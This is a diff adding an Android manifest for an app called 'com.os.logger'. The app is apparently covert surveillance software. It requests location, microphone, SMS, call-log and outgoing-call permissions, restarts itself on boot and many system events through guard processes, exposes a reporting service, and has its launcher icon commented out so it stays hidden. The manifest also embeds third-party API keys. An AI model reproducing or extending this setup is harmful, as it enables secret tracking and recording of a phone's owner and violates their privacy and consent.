@@ -1,0 +1,79 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.os.logger">
+
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+
+    <application
+        android:name="com.os.logger.LogApplication"
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:theme="@style/AppTheme">
+
+        <meta-data android:name="UMENG_APPKEY" android:value="575f7e5be0f55a711c000456"/>
+        <meta-data android:name="UMENG_CHANNEL" android:value="test"/>
+
+        <meta-data android:name="com.amap.api.v2.apikey"
+            android:value="4de0cebb91f778265c0e795badd050ea"/>      
+                         
+
+        <!--<activity android:name="com.os.logger.TestActivity"-->
+            <!--&gt;-->
+            <!--<intent-filter-->
+                <!--&gt;-->
+                <!--<action android:name="android.intent.action.MAIN"></action>-->
+                <!--<category android:name="android.intent.category.LAUNCHER"></category>-->
+            <!--</intent-filter>-->
+        <!--</activity>-->
+
+        <service
+            android:name="com.os.logger.ReportService"
+            android:enabled="true"
+            android:exported="true"
+            android:process=":remote">
+        </service>
+
+
+        <receiver android:name="com.os.logger.WakeReceiver" android:exported="true"
+            android:process=":remote">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.USER_PRESENT"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".RemoteReceiver" android:process=":remote"/>
+        <receiver android:name=".OutgoingCallReceiver" android:process=":remote">
+            <intent-filter android:priority="0">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+
+        <service android:name="com.os.logger.GuardService" android:process=":guard"/>
+        <receiver android:name="com.os.logger.GuardReceiver" android:process=":guard"/>
+
+        <service android:name="com.amap.api.location.APSService"></service>
+
+    </application>
+
+</manifest>
